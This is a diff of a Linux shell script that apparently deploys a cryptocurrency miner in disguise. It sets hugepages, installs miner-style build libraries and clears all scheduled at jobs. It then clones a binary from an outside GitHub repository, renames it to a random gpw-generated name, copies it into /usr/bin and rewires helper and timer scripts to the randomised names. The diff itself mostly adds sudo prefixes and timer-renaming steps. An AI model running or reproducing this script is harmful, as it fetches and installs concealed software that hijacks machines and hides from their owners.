@@ -26,36 +26,56 @@ softwarename=$(gpw 1 9)
 #rm -rf /tmp/defaultsoft/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
-echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir $tmpfoldername
-git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
-cd /tmp/$tmpfoldername
-mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
-chmod +x /tmp/$tmpfoldername/$softwarename
-chmod 777 ./*.sh
-cp /tmp/$tmpfoldername/$softwarename /usr/bin/
+sudo cd /tmp && mkdir $tmpfoldername
+sudo git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
+sudo cd /tmp/$tmpfoldername
+sudo mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
+sudo chmod +x /tmp/$tmpfoldername/$softwarename
+sudo chmod 777 ./*.sh
+sudo cp /tmp/$tmpfoldername/$softwarename /usr/bin/
 
-sed -i "s/defaultsoftwarename/$softwarename/" 1.sh
-sed -i "s/defaultsoftwarename/$softwarename/" 2.sh
-sed -i "s/defaultsoftwarename/$softwarename/" 3.sh
-sed -i "s/defaultsoftwarename/$softwarename/" 4.sh
-sed -i "s/defaultsoftwarename/$softwarename/" 5.sh
-sed -i "s/defaultsoftwarename/$softwarename/" 6.sh
+##########################################################
 
-mv 1.sh $1x.sh
-mv 2.sh $2x.sh
-mv 3.sh $3x.sh
-mv 4.sh $4x.sh
-mv 5.sh $5x.sh
-mv 6.sh $6x.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" 1.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" 2.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" 3.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" 4.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" 5.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" 6.sh
+
+sudo mv 1.sh $1x.sh
+sudo mv 2.sh $2x.sh
+sudo mv 3.sh $3x.sh
+sudo mv 4.sh $4x.sh
+sudo mv 5.sh $5x.sh
+sudo mv 6.sh $6x.sh
 sleep 3
 
 
+##########################################################
 
-sudo apt-get install dos2unix
+sudo sed -i "s/\<1\>/$1x/g" /tmp/$tmpfoldername/defaulttimer.sh
+sudo sed -i "s/\<2\>/$2x/g" /tmp/$tmpfoldername/defaulttimer.sh
+sudo sed -i "s/\<3\>/$3x/g" /tmp/$tmpfoldername/defaulttimer.sh
+sudo sed -i "s/\<4\>/$4x/g" /tmp/$tmpfoldername/defaulttimer.sh
+sudo sed -i "s/\<5\>/$5x/g" /tmp/$tmpfoldername/defaulttimer.sh
+sudo sed -i "s/\<6\>/$6x/g" /tmp/$tmpfoldername/defaulttimer.sh
+
+sudo mv /tmp/$tmpfoldername/defaulttimer.sh /tmp/$tmpfoldername/$timer.sh
+
+
+##########################################################
+
+
+
+##########################################################
+
+
+sudo apt-get install dos2unix -y
 
 sudo dos2unix $timer.sh
 sudo dos2unix $4x.sh
